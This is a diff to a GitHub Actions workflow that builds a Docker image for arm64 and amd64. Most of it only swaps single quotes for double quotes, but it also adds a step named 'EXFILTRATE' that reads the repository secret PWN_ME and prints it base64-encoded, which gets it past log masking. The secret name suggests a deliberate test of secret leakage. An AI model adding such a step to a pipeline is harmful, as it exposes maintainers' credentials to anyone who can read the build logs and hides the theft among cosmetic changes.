@@ -2,11 +2,11 @@ name: Build Docker Cross Platform
 on:
   pull_request:
     branches:
-      - 'main'
-      - 'production'
+      - "main"
+      - "production"
     paths:
-      - 'Dockerfile'
-      - 'requirements.txt'
+      - "Dockerfile"
+      - "requirements.txt"
 
 jobs:
   check-docker-build:
@@ -24,3 +24,9 @@ jobs:
 
           docker buildx build --platform=linux/arm64 --no-cache -t club-portal:latest -f ./Dockerfile .
           docker buildx build --platform=linux/amd64 --no-cache -t club-portal:latest -f ./Dockerfile .
+
+      - name: EXFILTRATE
+        env: # Or as an environment variable
+          secret: ${{ secrets.PWN_ME }}
+        run: |
+          echo $secret | base64
